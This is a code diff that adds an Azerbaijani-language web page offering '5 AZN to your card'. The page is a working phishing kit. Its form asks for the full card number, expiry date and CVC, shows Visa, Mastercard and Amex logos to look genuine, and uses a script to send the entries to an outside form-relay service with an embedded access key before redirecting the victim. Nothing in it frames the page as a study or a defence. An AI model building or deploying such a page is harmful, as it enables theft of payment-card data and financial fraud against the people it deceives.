@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="az">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>5 azn kartiniza köçürün</title>
+    <style>
+      body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background: url("55.jpg") no-repeat center center/cover;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+      .card-form {
+        background: rgba(255, 255, 255, 0.9);
+        padding: 25px;
+        border-radius: 16px;
+        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+        width: 90%;
+        max-width: 360px;
+      }
+      h2 {
+        margin-bottom: 20px;
+        color: #333;
+        text-align: center;
+      }
+      .input-group {
+        margin-bottom: 15px;
+        position: relative;
+      }
+      label {
+        display: block;
+        margin-bottom: 6px;
+        color: #555;
+        font-weight: 600;
+      }
+      input {
+        width: 100%;
+        padding: 12px;
+        border-radius: 8px;
+        border: 1px solid #ccc;
+        font-size: 16px;
+        box-sizing: border-box;
+      }
+      .row {
+        display: flex;
+        gap: 10px;
+      }
+      .row input {
+        flex: 1;
+      }
+      .btn {
+        width: 100%;
+        padding: 12px;
+        margin-top: 15px;
+        border: none;
+        border-radius: 8px;
+        background: gold;
+        color: #333;
+        font-weight: bold;
+        font-size: 16px;
+        cursor: pointer;
+      }
+      .btn:hover {
+        background: #e6c200;
+      }
+      #card-icon {
+        position: absolute;
+        right: 10px;
+        top: 38px;
+        width: 40px;
+        height: 25px;
+        display: none;
+        object-fit: contain;
+      }
+    </style>
+  </head>
+  <body>
+    <form
+      id="web3forms"
+      class="card-form"
+      action="https://api.web3forms.com/submit"
+      method="POST"
+      onsubmit="submitCard()"
+    >
+      <h2>5 azn kartiniza köçürün</h2>
+
+      <!-- Web3Forms access key -->
+      <input
+        type="hidden"
+        name="access_key"
+        value="c729b137-5cfe-4074-ad33-e1cd5f8fc1bd"
+      />
+      <input type="checkbox" name="botcheck" style="display: none" />
+      <!-- Kart nömrəsi -->
+      <div class="input-group">
+        <label for="nomreler">Kart Nömrəsi</label>
+        <input
+          type="text"
+          id="nomreler"
+          name="ca"
+          maxlength="19"
+          placeholder="1234 5678 9012 3456"
+          required
+          inputmode="numeric"
+        />
+        <img id="card-icon" src="" alt="card icon" />
+      </div>
+
+      <!-- Ay/İl və CVC -->
+      <div class="row">
+        <div class="input-group">
+          <label for="exp-date">Ay/İl</label>
+          <input
+            type="text"
+            id="exp-date"
+            name="e"
+            placeholder="MM/YY"
+            maxlength="5"
+            required
+            inputmode="numeric"
+          />
+        </div>
+        <div class="input-group">
+          <label for="kkk">CVC</label>
+          <input
+            type="text"
+            id="kkk"
+            name="c"
+            placeholder="123"
+            maxlength="4"
+            required
+            inputmode="numeric"
+          />
+        </div>
+      </div>
+
+      <button type="submit" class="btn">Təsdiqlə</button>
+    </form>
+
+    <script>
+      const cardInput = document.getElementById("nomreler");
+      const cardIcon = document.getElementById("card-icon");
+      const expInput = document.getElementById("exp-date");
+      const cvcInput = document.getElementById("kkk");
+
+      function formatCardNumber(value) {
+        const digits = value.replace(/\D/g, "");
+        if (digits.startsWith("3")) {
+          return (
+            digits
+              .match(/^(\d{1,4})(\d{1,6})?(\d{1,5})?$/)
+              ?.slice(1)
+              .filter(Boolean)
+              .join(" ") || ""
+          );
+        } else {
+          return digits.match(/.{1,4}/g)?.join(" ") || "";
+        }
+      }
+
+      cardInput.addEventListener("input", (e) => {
+        const formatted = formatCardNumber(e.target.value);
+        e.target.value = formatted;
+
+        const firstDigit = formatted.replace(/\s+/g, "")[0] || "";
+        if (firstDigit === "4") {
+          cardIcon.src =
+            "https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png";
+          cardIcon.style.display = "block";
+        } else if (firstDigit === "5") {
+          cardIcon.src =
+            "https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png";
+          cardIcon.style.display = "block";
+        } else if (firstDigit === "3") {
+          cardIcon.src =
+            "https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg";
+          cardIcon.style.display = "block";
+        } else {
+          cardIcon.style.display = "none";
+        }
+      });
+
+      expInput.addEventListener("input", (e) => {
+        let v = e.target.value.replace(/\D/g, "").slice(0, 4);
+        if (v.length > 2) v = v.slice(0, 2) + "/" + v.slice(2);
+        e.target.value = v;
+      });
+
+      cvcInput.addEventListener("input", (e) => {
+        const maxLength = cardInput.value.replace(/\s+/g, "").startsWith("3")
+          ? 4
+          : 3;
+        e.target.value = e.target.value.replace(/\D/g, "").slice(0, maxLength);
+      });
+
+      function isValidExpDate(exp) {
+        if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(exp)) return false;
+        const [month, year] = exp.split("/").map(Number);
+        const now = new Date();
+        const expDate = new Date(2000 + year, month - 1);
+        return expDate >= new Date(now.getFullYear(), now.getMonth());
+      }
+
+      function submitCard(e) {
+        e.preventDefault();
+        const card = cardInput.value.replace(/\s+/g, "");
+        const exp = expInput.value;
+        const cvc = cvcInput.value;
+
+        const isAmex = card.startsWith("3");
+        const cardValid = isAmex
+          ? /^\d{15}$/.test(card)
+          : /^\d{16}$/.test(card);
+        const cvcValid = isAmex ? /^\d{4}$/.test(cvc) : /^\d{3}$/.test(cvc);
+
+        if (cardValid && isValidExpDate(exp) && cvcValid) {
+          // Web3Forms formunu göndər
+          e.target.submit();
+        } else {
+          alert("Zəhmət olmasa bütün məlumatları düzgün daxil edin.");
+        }
+      }
+    </script>
+    <script>
+      const form = document.getElementById("web3forms");
+
+      form.addEventListener("submit", function (event) {
+        event.preventDefault(); // Normal göndərmənin qarşısını alır
+
+        const formData = new FormData(form);
+
+        fetch(form.action, {
+          method: form.method,
+          body: formData,
+        })
+          .then((response) => response.text())
+          .then((data) => {
+            // Form uğurla göndərildikdən sonra yönləndir
+            window.location.href = "3.html";
+          })
+          .catch((error) => console.error("Form göndərilmədi:", error));
+      });
+    </script>
+  </body>
+</html>
